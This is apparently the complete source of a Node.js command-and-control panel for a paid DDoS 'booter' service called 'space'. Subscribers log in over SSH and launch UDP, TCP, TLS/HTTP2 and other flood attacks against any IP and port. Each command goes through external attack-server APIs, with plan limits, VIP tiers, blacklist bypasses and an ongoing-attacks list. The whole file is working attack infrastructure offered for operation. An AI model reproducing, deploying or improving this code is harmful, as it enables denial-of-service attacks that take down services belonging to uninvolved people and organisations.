const fs = require('fs');
const ssh2 = require('ssh2');
const axios = require('axios');
const readline = require('readline');

// database
const users = require('./users.json').users;

// servers
const servers = require('./servers.json');

// attacks log
let attacksLog = require('./attacks.json').attacks;

// Blacklist
const blockedPrefixes = ["dstat", "fbi"];
const blacklist = fs.readFileSync('./blacklist.txt', 'utf8').split('\n').map(line => line.trim());

// botnet name, banner(optional) and port
const cnc_name = "space";
const cnc_port = 777;

const color = {
    red: '\x1b[38;5;1m',
    blue: '\x1b[34m',
    green: '\x1b[38;5;46m',
    violet: '\x1b[35m',
    white: '\x1b[38;5;250m',
    reset: '\x1b[0m'
};

const usedSlots = {
    '.udp': 0,
    '.pudp': 0,
    '.dns': 0,
    '.tcp': 0,
    '.socket': 0,
    '.tls': 0,
    '.browser': 0,
    '.game': 0,
    '.tfo': 0,
    '.rapid': 0,
    '.ovh': 0,
};

let onlineUsers = 1;
let runningAttacks = 0;
const ongoingAttacksByTarget = {};
const ongoingAttacks = [];
let attacksEnabled = true;

function removeExpiredKeys() {
    const currentDate = new Date();
    const usersData = require('./users.json');
    const updatedUsers = usersData.users.filter(user => {
        const expirationDate = new Date(user.expire);
        return expirationDate > currentDate;
    });
    usersData.users = updatedUsers;
    fs.writeFileSync('./users.json', JSON.stringify(usersData, null, 4));
}

removeExpiredKeys();

setInterval(removeExpiredKeys, 600000);

function removeExpiredAttacks() {
    const currentDate = new Date();

    const updatedUsers = users.map(user => {
        const updatedAttacks = user.attacks.filter(attack => {
            const endTime = new Date(attack.end_time);
            return endTime > currentDate;
        });

        return {
            ...user,
            attacks: updatedAttacks
        };
    });

    const usersData = require('./users.json');
    usersData.users = updatedUsers;

    fs.writeFileSync('./users.json', JSON.stringify(usersData, null, 4));
}

setInterval(removeExpiredAttacks, 180000);

function send_attack(client, method, ...args) {
    if (!attacksEnabled) {
        return 'Attacks are currently disabled.\r\n';
    }

    const [host, port, time] = args;

    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^:(:[0-9a-fA-F]{1,4}){1,7}$/;
    const ipRangeRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$/;

    const user = users.find(user => user.username === client.username) || {};
    if (!user.blacklistbypass && blacklist.includes(host)) {
        return 'This target is blacklisted.\r\n';
    }

    if ((method === '.gudp' || method === '.gtcp') && !user['Vip']) {
    return "You can't use this method\r\n";
}

if (user.slotbypass || runningAttacks < 10) {
    runningAttacks++;
} else {
    return 'Max attack slots of 10 are in use, please try again later.\r\n';
}

const isBlocked = blockedPrefixes.some(prefix => host.includes(prefix));

if (isBlocked) {
    return 'This target is blacklisted.\r\n';
}

    if (host.endsWith('.gov') || host.endsWith('.edu')) {
        return 'You can\'t attack gov/edu sites\r\n';
    }

    if ((method === '.pudp' || method === '.tcp' || method === '.gudp' || method === '.udp' || method === '.ovh' || method === '.tfo' || method === '.game' || method === '.rapid' || method === '.socket') && time > 300) {
        return `Max time for this ${method} - 300 seconds.\r\n`;
    }

    if (!user.Powersavingbypass) {
        if (ongoingAttacksByTarget[host]) {
            return `The target you provided is already under attack.\r\n`;
        }
    }

    ongoingAttacksByTarget[host] = true;

    if (port < 0 || port > 65535) {
        return 'The port you provided is invalid.\r\n';
    }

    if (time < 30 || time > 86400) {
        return 'The time you provided is invalid.\r\n';
    }

    if (!servers.hasOwnProperty(method)) {
        return `Unknown attack method '${method}'\r\n`;
    }
    
    if (usedSlots[method] >= 2) {
        return `All slots for ${method} are in use, please try again later.\r\n`;
    }

    let clientAttacks = user.attacks || [];

    if (clientAttacks.length >= user.concurrents) {
        return `You have reached your max concurrents of ${user.concurrents}.\r\n`;
    }

    if (time > user.max_boot) {
        return `The duration you provided is above your max attack time of ${user.max_boot} seconds.\r\n`;
    }

    const url = servers[method].api
        .replace('$host', host)
        .replace('$port', port)
        .replace('$time', time);

    const attack = {
        method,
        host,
        port,
        time,
        end_time: Date.now() + time * 1000,
        username: client.username
    };

    clientAttacks.push(attack);
    
    usedSlots[method]++;

    axios.get(url)
        .then(response => {
setTimeout(() => {
    const attackIndex = clientAttacks.findIndex(a => a.host === attack.host && a.port === attack.port && a.time === attack.time);
if (attackIndex !== -1) {
    clientAttacks.splice(attackIndex, 1);
    user.attacks = clientAttacks; 
}

    console.log(`${cnc_name} - attack ended on ${attack.host}`)

runningAttacks--;

usedSlots[method]--;

delete ongoingAttacksByTarget[host];

const ongoingIndex = ongoingAttacks.findIndex(a => a === attack);
if (ongoingIndex !== -1) {
    ongoingAttacks.splice(ongoingIndex, 1);
}

    runningAttacks--;
}, time * 1000);

            ongoingAttacks.push(attack);
        })
        .catch(error => {
       
            clientAttacks = clientAttacks.filter(a => a !== attack);
            user.attacks = clientAttacks; 
            console.log(`${cnc_name} - failed to attack ${attack.host}`)

            const attackIndex = ongoingAttacks.findIndex(a => a === attack);
            if (attackIndex !== -1) {
                ongoingAttacks.splice(attackIndex, 1);
            }
   
            runningAttacks--;
        });

    attacksLog.push({
        ...attack,
        username: user.username
    });
    fs.writeFileSync('./attacks.json', JSON.stringify({
        attacks: attacksLog
    }));

    console.log(`Attack sent to ${attack.host}:${attack.port} using ${attack.method} by ${user.username}`)
    return `${color.white}Succesfully sent to all ${color.red}${cnc_name} ${color.white}servers${color.red}...\r\n`;
}

function sendHelpText(stream) {
    const helpText = `Our commands\x1b[38;5;99m: \r\n\x1b[38;5;255mmethods \x1b[38;5;99m- \x1b[38;5;255mview methods page\x1b[38;5;99m. \r\n\x1b[38;5;255mrules \x1b[38;5;99m- \x1b[38;5;255mshows the rules of our service\x1b[38;5;99m. \r\n\x1b[38;5;255mongoing \x1b[38;5;99m- \x1b[38;5;255mview ongoing attacks\x1b[38;5;99m. \r\n\x1b[38;5;255mplan \x1b[38;5;99m- \x1b[38;5;255mview your plan details\x1b[38;5;99m. \r\n\x1b[38;5;255mpasswd \x1b[38;5;99m- \x1b[38;5;255mchange your password\x1b[38;5;99m. \r\n`;

    stream.write(helpText);
}

function sendrulesText(stream) {
    const rulesText = `1.Do not share your account\x1b[31m.\r\n\x1b[38;5;255m2.We do not issue refunds\x1b[31m. \r\n\x1b[38;5;255m3.Do not insult the administration\x1b[31m. \r\n`;

    stream.write(rulesText);
}

async function sendPlan(client) {
    const user = users.find(user => user.username === client.username) || {};
    const planText = `Your current plan\x1b[31m: \r\n\x1b[38;5;255mUsername\x1b[31m: \x1b[38;5;255m${user.username} \r\n\x1b[38;5;255mMax Attack Time\x1b[31m: \x1b[38;5;255m${user.max_boot} seconds \r\n\x1b[38;5;255mConcurrents\x1b[31m: \x1b[38;5;255m${user.concurrents} \r\n\x1b[38;5;255mCooldown\x1b[31m: \x1b[38;5;255m0 seconds \r\n\x1b[38;5;255mUser Ongoing Attack Count\x1b[31m: \x1b[38;5;255m${user.attacks.length} \r\n\x1b[38;5;255mVIP Status\x1b[31m: ${user.Vip ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mReseller Status\x1b[31m: ${user.Reseller ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mModerator Status\x1b[31m: ${user.Moder ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mAdministrator Status\x1b[31m: ${user.Admin ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mBypass PowerSaving Status\x1b[31m: ${user.Powersavingbypass ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mBypass Blacklist Status\x1b[31m: ${user.blacklistbypass ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mSlot bypass\x1b[31m: ${user.slotbypass ? color.green + 'true' : color.red + 'false'} \r\n\x1b[38;5;255mExpire\x1b[31m: \x1b[38;5;255m${user.expire} \r\n\x1b[38;5;255mAccount Created By\x1b[31m: \x1b[38;5;255mroot \r\n\x1b[38;5;255mActive Theme\x1b[31m: \x1b[38;5;255mdefault \r\n`;
    return planText;
}

function changePassword(client, stream) {
    const rl = readline.createInterface({
        input: stream,
        output: stream
    });

    stream.write("\r\nEnter your new password: ");
    rl.question("", (newPassword) => {
        stream.write("Reenter your new password: ");
        rl.question("", (confirmPassword) => {
            if (newPassword === confirmPassword) {
                const user = users.find(user => user.username === client.username);
                if (user) {
                    user.password = newPassword;
                    fs.writeFileSync('./users.json', JSON.stringify({ users }, null, 4));
                    stream.write("\r\nYour password successfully changed\r\n");

                    stream.write(`${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `);
                } else {
                    stream.write("\r\nUser not found\r\n");

                    stream.write(`${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `);
                }
            } else {
                stream.write("\r\nThe password has not changed, you entered different passwords.");

                stream.write(`${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `);
            }
            rl.close();
        });
    });
}

function startServer() {
    var server = new ssh2.Server({
        hostKeys: [fs.readFileSync("/etc/ssh/ssh_host_rsa_key")]
    }, (client) => {
        onlineUsers++; 

        client.on('close', () => {
            onlineUsers--; 
        });

        client.on('authentication', async (ctx) => {
            client.username = ctx.username;
            client.password = ctx.password;

            if (ctx.method === 'password') {
                try {
                    const user = users.find(user => user.username === client.username && user.password === client.password);
                    if (user) {
                        client.banner = `\r\n${color.white}Welcome to botnet ${color.red}${client.username}\r\n`;

                        return ctx.accept();
                    } else {
                        return ctx.reject();
                    }
                } catch (e) {
                    return ctx.reject();
                }
            } else {
                return ctx.reject(['password']);
            }
        });

        client.on('ready', () => {
            client.on('session', (accept, reject) => {
                const session = accept();

                session.on('pty', (accept, reject, info) => {
                    accept();
                });

                session.once('shell', (accept, reject, info) => {
                    var stream = accept();
                    stream.write(`\x1b[2J\x1b[1H`)
                    stream.write(`\x1b]0;[|] ${cnc_name} | Welcome, ${client.username} | Online: ${onlineUsers} | Running: ${runningAttacks}/10\x07`);
                    if (client.banner) {
                        stream.write(client.banner);
                    }

                    var chunk = '';
                    
                    stream.on('data', async (data) => {
    var stringData = data.toString();
    if (stringData != '\r') {
        if (data[0] === 127) {
            if (chunk.length > 0) {
                chunk = chunk.slice(0, -1);
                stream.write('\x1b[1D\x1b[K');
            }
        } else {
            chunk += stringData;
            stream.write(data);
        }

        if (chunk.endsWith(`${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `)) {
            chunk = '';
        }
                        } else {
                            stream.write('\r\n');
                            try {
                                const availableMethods = Object.keys(servers);

                                var command = chunk.split(' ')[0];
                                var args = chunk.split(' ').slice(1);
                                chunk = '';

if (command === 'methods' || command === '?') {
    const methodsText = [
         `\x1b[38;5;99m* ${color.white}.udp${color.red}: \x1b[38;5;250mUDP flood\x1b[38;5;99m.`,
        `\x1b[38;5;99m* ${color.white}.tls${color.red}: \x1b[38;5;250mHTTP/2 Flooder\x1b[38;5;99m.`,
                                    ];

                                    stream.write(`\r\n`);
                                    methodsText.forEach((methodText) => {
                                        stream.write(`${methodText}\r\n`);
                                    });
                                    stream.write(`\r\n`);
                                }

                                else if (availableMethods.includes(command)) {
                                    if (args.length !== 3) {
                                        stream.write(`Invalid Usage. \r\nUsage: ${command} <target> <port> <time> \r\nExample: ${command} 74.74.74.74 53 60\r\n`);
                                    } else {
                                        var response = send_attack(client, command, ...args);
                                        stream.write(response);
                                    }
                                }
                                // clear command
                                else if (command === 'cls' || command === 'clear') {
                                    stream.write(`\x1b[2J\x1b[1H`);
                                    if (client.banner) {
                                        stream.write(client.banner);
                                    }
                                }

                                // exit command
                                else if (command === 'exit') {
                                    stream.end();
                                }
                                
                                // off attack & on attack
else if (command === 'off') {
    if (client.username === 'root') {
        attacksEnabled = false;
        stream.write(`All attacks are now disabled.\r\n`);
    } else {
        stream.write(`You do not have permission to execute that command.\r\n`);
    }
} else if (command === 'on') {
    if (client.username === 'root') {
        attacksEnabled = true;
        stream.write(`All attacks are now enabled.\r\n`);
    } else {
        stream.write(`You do not have permission to execute that command.\r\n`);
    }
}
                                // Add user command
else if (command === 'add') {
    if (client.username === 'root') {
        const newUser = {};
        const rl = readline.createInterface({
            input: stream,
            output: stream
        });

        rl.question("\r\nUsername: ", (username) => {
            newUser.username = username;
            rl.question("\r\nPassword: ", (password) => {
                newUser.password = password;
                rl.question("Concurrents: ", (concurrents) => {
                    newUser.concurrents = parseInt(concurrents);
                    rl.question("Max Boot (seconds): ", (max_boot) => {
                        newUser.max_boot = parseInt(max_boot);
                        rl.question("Expire (in days): ", (expire) => {
                            const currentDate = new Date();
                            currentDate.setDate(currentDate.getDate() + parseInt(expire));
                            newUser.expire = currentDate.toISOString();
                            rl.question("Blacklist Bypass (true/false): ", (blacklistbypass) => {
                                newUser.blacklistbypass = (blacklistbypass.toLowerCase() === 'true');
                                users.push(newUser);
                                fs.writeFileSync('./users.json', JSON.stringify({ users }, null, 4));
                                stream.write(`User '${newUser.username}' added successfully.\r\n`);
                                rl.close();
                                stream.write(`${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `);
                            });
                        });
                    });
                });
            });
        });
    } else {
        stream.write(`You do not have permission to execute that command.\r\n`);
    }
}

// Del user command
else if (command === 'del') {
    if (client.username === 'root') {
        const usernameToDelete = args[0];
        const userIndex = users.findIndex(user => user.username === usernameToDelete);
        if (userIndex !== -1) {
            users.splice(userIndex, 1);
            fs.writeFileSync('./users.json', JSON.stringify({ users }, null, 4));
            stream.write(`User '${usernameToDelete}' deleted successfully.\r\n`);
        } else {
            stream.write(`User '${usernameToDelete}' not found.\r\n`);
        }
    } else {
        stream.write(`You do not have permission to execute that command.\r\n`);
    }
}

                                // password change command
                                else if (command === 'passwd') {
                                    changePassword(client, stream);
                                }

                                // help command
                                else if (command === 'help') {
                                    sendHelpText(stream);
                                }
                                
                                // help command
                                else if (command === 'rules') {
                                    sendrulesText(stream);
                                }

                                // plan command
                                else if (command === 'plan') {
                                    const planResponse = await sendPlan(client);
                                    stream.write(planResponse);
                                }
                                else if (command === 'ongoing') {
    if (ongoingAttacks.length > 0) {
        stream.write('  #        Target               Method          Port      Length      Finish       User\r\n');
        stream.write('------  ---------------  ------------------  ---------  ----------  ----------  ----------\r\n');
        ongoingAttacks.forEach((attack, index) => {
            const { username, host, port, time, end_time, method } = attack;
            const timeRemaining = Math.max(0, Math.ceil((end_time - Date.now()) / 1000));
            const attackNumber = index + 1;
            if (username === client.username) {
                stream.write(`  ${attackNumber.toString().padEnd(2)}    ${host.padEnd(20)} ${method.padEnd(20)}  ${port.toString().padEnd(9)}  ${time.toString().padEnd(10)}  ${timeRemaining.toString().padEnd(9)}${client.username}\r\n`);
            } else {
                stream.write(`  ${attackNumber.toString().padEnd(2)}    *******              ${method.padEnd(22)}${port.toString().padEnd(11)}${time.toString().padEnd(12)}${timeRemaining.toString().padEnd(9)}******\r\n`);
            }
        });
    } else {
        stream.write('There are currently no ongoing attacks.\r\n');
    }
}

                                stream.write(`${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `);
                            } catch (e) {}
                        }
                    });

                    if (typeof stream != 'undefined') {
                        stream.write(`\r\n${color.red}${client.username}${color.white} • ${color.red}${cnc_name} \x1b[97m> `);
                    }
                });
            });
        });

        client.on('close', () => {});
        client.on('error', () => {});
    });

    server.listen(cnc_port, () => console.log(`${cnc_name} started - listening for ssh connections on port ${cnc_port}`));
}

startServer();
